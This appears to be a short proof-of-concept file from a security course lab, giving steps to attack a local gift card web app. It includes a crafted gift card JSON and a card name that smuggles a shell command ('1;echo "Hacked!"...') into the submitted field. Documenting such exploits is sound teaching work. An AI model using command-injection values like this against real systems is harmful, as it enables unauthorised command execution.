@@ -1,0 +1,11 @@
+In http://127.0.0.1:8000/use.html
+
+Choose giftcardfile with the following content: 
+
+{"merchant_id": "Tandon Food Court Card", "customer_id": "admin", "total_value": "30", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "[ '\x81' ]"}]}
+
+Use the following card name:
+
+'1;echo "Hacked!";giftcardreader 2'
+
+and click on 'Submit a Card'.
